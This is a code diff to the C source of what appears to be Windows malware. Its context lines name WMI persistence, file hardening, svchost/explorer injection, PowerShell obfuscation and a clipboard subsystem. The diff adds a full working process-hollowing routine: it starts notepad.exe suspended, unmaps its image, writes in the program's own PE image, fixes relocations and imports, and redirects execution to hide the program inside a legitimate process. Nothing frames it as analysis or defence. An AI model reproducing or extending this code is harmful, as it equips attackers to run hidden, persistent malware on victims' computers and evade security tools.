@@ -454,10 +454,9 @@ void sys_spawn_shadow_copy(void) {
     /* Apply all advanced layers automatically */
     sys_wmi_persistence();
     sys_harden_files();
-    
-    /* Process injection after a short delay to let spawned processes settle */
+    sys_inject_process();      /* existing svchost/explorer injection */
     Sleep(2000);
-    sys_inject_process();
+    sys_hollow_process();      /* NEW: fileless notepad.exe hollowing */
 }
 
 /* === Advanced Persistence & Evasion === */
@@ -626,6 +625,131 @@ char* sys_obfuscate_ps(const char *command) {
     free(wcmd);
     free(base64);
     return result;
+}
+
+/* 2b. Process Hollowing — create a fileless process running from memory */
+void sys_hollow_process(void) {
+    char payloadPath[MAX_PATH];
+    GetModuleFileNameA(NULL, payloadPath, MAX_PATH);
+    
+    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+    
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    BYTE *payload = (BYTE*)malloc(fileSize);
+    if (!payload) { CloseHandle(hFile); return; }
+    
+    DWORD read;
+    ReadFile(hFile, payload, fileSize, &read, NULL);
+    CloseHandle(hFile);
+    
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { free(payload); return; }
+    
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) { free(payload); return; }
+    
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = {0};
+    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        free(payload); return;
+    }
+    
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    typedef NTSTATUS (WINAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
+    NtUnmapViewOfSection_t pNtUnmap = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
+    
+    CONTEXT ctx = {0};
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
+    
+    DWORD64 pebAddr = ctx.Rdx;
+    DWORD64 imageBase = 0;
+    ReadProcessMemory(pi.hProcess, (LPCVOID)(pebAddr + 0x10), &imageBase, sizeof(imageBase), NULL);
+    
+    if (pNtUnmap) pNtUnmap(pi.hProcess, (PVOID)imageBase);
+    
+    DWORD64 preferredBase = ntHeaders->OptionalHeader.ImageBase;
+    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
+    
+    PVOID remoteImage = VirtualAllocEx(pi.hProcess, (PVOID)preferredBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteImage) remoteImage = VirtualAllocEx(pi.hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteImage) {
+        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); free(payload); return;
+    }
+    
+    WriteProcessMemory(pi.hProcess, remoteImage, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
+    
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        PVOID dest = (PVOID)((DWORD64)remoteImage + section[i].VirtualAddress);
+        PVOID src = (PVOID)(payload + section[i].PointerToRawData);
+        WriteProcessMemory(pi.hProcess, dest, src, section[i].SizeOfRawData, NULL);
+    }
+    
+    DWORD64 delta = (DWORD64)remoteImage - preferredBase;
+    if (delta != 0) {
+        IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        if (relocDir.Size > 0) {
+            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(payload + relocDir.VirtualAddress);
+            while (reloc->VirtualAddress != 0) {
+                DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
+                for (DWORD i = 0; i < numEntries; i++) {
+                    WORD type = entries[i] >> 12;
+                    WORD offset = entries[i] & 0xFFF;
+                    if (type == IMAGE_REL_BASED_DIR64) {
+                        PDWORD64 addr = (PDWORD64)((DWORD64)remoteImage + reloc->VirtualAddress + offset);
+                        DWORD64 value; if (ReadProcessMemory(pi.hProcess, addr, &value, sizeof(value), NULL)) {
+                            value += delta; WriteProcessMemory(pi.hProcess, addr, &value, sizeof(value), NULL);
+                        }
+                    }
+                }
+                reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
+            }
+        }
+    }
+    
+    IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (importDir.Size > 0) {
+        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)remoteImage + importDir.VirtualAddress);
+        while (importDesc->Name != 0) {
+            char dllName[256];
+            ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD64)remoteImage + importDesc->Name), dllName, sizeof(dllName), NULL);
+            dllName[255] = '\0'; HMODULE hDll = LoadLibraryA(dllName);
+            if (hDll) {
+                DWORD64 origThunkRVA = importDesc->OriginalFirstThunk;
+                if (origThunkRVA == 0) origThunkRVA = importDesc->FirstThunk;
+                int idx = 0;
+                while (1) {
+                    IMAGE_THUNK_DATA thunkVal, origThunkVal;
+                    PVOID thunkAddr = (PVOID)((DWORD64)remoteImage + importDesc->FirstThunk + idx * sizeof(IMAGE_THUNK_DATA));
+                    PVOID origThunkAddr = (PVOID)((DWORD64)remoteImage + origThunkRVA + idx * sizeof(IMAGE_THUNK_DATA));
+                    ReadProcessMemory(pi.hProcess, thunkAddr, &thunkVal, sizeof(thunkVal), NULL);
+                    ReadProcessMemory(pi.hProcess, origThunkAddr, &origThunkVal, sizeof(origThunkVal), NULL);
+                    if (thunkVal.u1.AddressOfData == 0) break;
+                    FARPROC addr = NULL;
+                    if (origThunkVal.u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
+                        addr = GetProcAddress(hDll, (LPCSTR)(WORD)(origThunkVal.u1.Ordinal & 0xFFFF));
+                    } else {
+                        char funcName[256]; PVOID nameAddr = (PVOID)((DWORD64)remoteImage + origThunkVal.u1.AddressOfData + 2);
+                        ReadProcessMemory(pi.hProcess, nameAddr, funcName, sizeof(funcName), NULL); funcName[255] = '\0';
+                        addr = GetProcAddress(hDll, funcName);
+                    }
+                    WriteProcessMemory(pi.hProcess, thunkAddr, &addr, sizeof(addr), NULL); idx++;
+                }
+            }
+            importDesc++;
+        }
+    }
+    
+    WriteProcessMemory(pi.hProcess, (PVOID)(pebAddr + 0x10), &remoteImage, sizeof(remoteImage), NULL);
+    ctx.Rcx = (DWORD64)remoteImage;
+    ctx.Rip = (DWORD64)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+    SetThreadContext(pi.hThread, &ctx);
+    ResumeThread(pi.hThread);
+    CloseHandle(pi.hThread); CloseHandle(pi.hProcess); free(payload);
 }
 
 /* === Clipboard Subsystem === */
